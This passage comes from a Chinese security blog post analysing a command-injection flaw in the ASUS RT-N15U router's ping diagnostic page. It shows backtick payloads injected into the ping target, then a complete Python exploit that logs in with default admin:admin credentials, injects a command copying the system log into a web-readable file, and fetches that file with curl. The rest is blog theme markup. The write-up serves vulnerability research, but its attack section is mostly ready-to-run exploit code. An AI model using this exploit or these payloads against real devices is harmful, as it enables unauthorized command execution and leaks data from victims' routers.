+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">`<span class="hljs-built_in">echo</span> 1&gt;/tmp/aaa`    或者    $(<span class="hljs-built_in">echo</span> 1&gt;/tmp/aaa)<br></code></pre></td></tr></table></figure>
+
+<p>如果说我们ping输入框输入&#96;&#96;&#96;&#96;echo 1&gt;&#x2F;tmp&#x2F;aaa&#96;&#96;&#96;的话，最后会拼接成如下命令在系统中执行</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">sh -c ping -c <span class="hljs-number">5</span> <span class="hljs-string">`echo 1&gt;/tmp/aaa`</span> &gt; <span class="hljs-regexp">/tmp/</span>syscmd.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>
+
+<p>反引号的特殊性：反引号括起来的命令，它会被先执行，并且其输出将作为 <code>ping</code> 命令的参数之一。</p>
+<p>实现成功：</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723194818278.png" srcset="/img/loading.gif" lazyload alt="image-20240723194818278"></p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723194844617.png" srcset="/img/loading.gif" lazyload alt="image-20240723194844617"></p>
+<h4 id="3，漏洞利用"><a href="#3，漏洞利用" class="headerlink" title="3，漏洞利用"></a>3，漏洞利用</h4><p>burp抓包发现不仅要发一个payload的包，还需要跟进一个重定向的发包，所以exp要发两个包</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723212700603.png" srcset="/img/loading.gif" lazyload alt="image-20240723212700603"></p>
+<p><strong>exp</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import subprocess<br><br>burp0_url = <span class="hljs-string">&quot;http://192.168.1.1:80/apply.cgi?current_page=Main_Analysis_Content.asp&amp;next_page=Main_Analysis_Content.asp&amp;group_id=&amp;modified=0&amp;action_mode=+Refresh+&amp;action_script=&amp;action_wait=&amp;first_time=&amp;preferred_lang=EN&amp;SystemCmd=ping+-c+5+%60cat+%2Ftmp%2Fsyslog.log%3E+test13.asp%60&amp;firmver=3.0.0.4&amp;cmdMethod=ping&amp;destIP=%60cat+%2Ftmp%2Fsyslog.log%3E+test13.asp%60&amp;pingCNT=5&quot;</span><br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate, br&quot;</span>, <span class="hljs-string">&quot;Authorization&quot;</span>: <span class="hljs-string">&quot;Basic YWRtaW46YWRtaW4=&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://192.168.1.1/Main_Analysis_Content.asp&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br><br><span class="hljs-comment"># 创建一个 Session 对象，用于保持会话状态</span><br>session = requests.Session()<br><br><span class="hljs-comment"># 发送请求</span><br>session.<span class="hljs-built_in">get</span>(burp0_url, <span class="hljs-attribute">headers</span>=burp0_headers)<br><br>burp1_url = <span class="hljs-string">&quot;http://192.168.1.1:80/Main_Analysis_Content.asp&quot;</span><br>burp1_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate, br&quot;</span>, <span class="hljs-string">&quot;Authorization&quot;</span>: <span class="hljs-string">&quot;Basic YWRtaW46YWRtaW4=&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://192.168.1.1/apply.cgi?current_page=Main_Analysis_Content.asp&amp;next_page=Main_Analysis_Content.asp&amp;group_id=&amp;modified=0&amp;action_mode=+Refresh+&amp;action_script=&amp;action_wait=&amp;first_time=&amp;preferred_lang=EN&amp;SystemCmd=ping+-c+5+%60cat+%2Ftmp%2Fsyslog.log%3E+test13.asp%60&amp;firmver=3.0.0.4&amp;cmdMethod=ping&amp;destIP=%60cat+%2Ftmp%2Fsyslog.log%3E+test13.asp%60&amp;pingCNT=5&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>session.<span class="hljs-built_in">get</span>(burp1_url, <span class="hljs-attribute">headers</span>=burp1_headers)<br><br>def execute_shell_command(command):<br>    try:<br>        result = subprocess.<span class="hljs-built_in">run</span>(command, <span class="hljs-attribute">shell</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">check</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">stdout</span>=subprocess.PIPE, <span class="hljs-attribute">stderr</span>=subprocess.PIPE, <span class="hljs-attribute">universal_newlines</span>=<span class="hljs-literal">True</span>)<br>        return result.stdout.strip()<br>    except subprocess.CalledProcessError as e:<br>        return f<span class="hljs-string">&quot;Error executing command: &#123;e&#125;&quot;</span><br>    except Exception as e:<br>        return f<span class="hljs-string">&quot;Error: &#123;e&#125;&quot;</span><br><br><span class="hljs-comment">#这里调用linux系统命令有点多此一举，也可以直接调用request库获取返回包</span><br>command = <span class="hljs-string">&quot;curl http://192.168.1.1/test13.asp -H &#x27;Authorization: Basic YWRtaW46YWRtaW4=&#x27;&quot;</span><br>output = execute_shell_command(command)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Command output:&quot;</span>)<br><span class="hljs-built_in">print</span>(output)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240723221523818.png" srcset="/img/loading.gif" lazyload alt="image-20240723221523818"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>华硕_RT-N15U_命令执行漏洞分析</div>
+      <div>http://groundctl2majortom.github.io/2024/07/08/华硕-RT-N15U-命令执行漏洞分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>GroundCtl2MajorTom</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年7月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/" title="tenda_ac15_栈溢出">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">tenda_ac15_栈溢出</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/07/dir-823G%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/" title="dir-823G固件分析">
+                        <span class="hidden-mobile">dir-823G固件分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
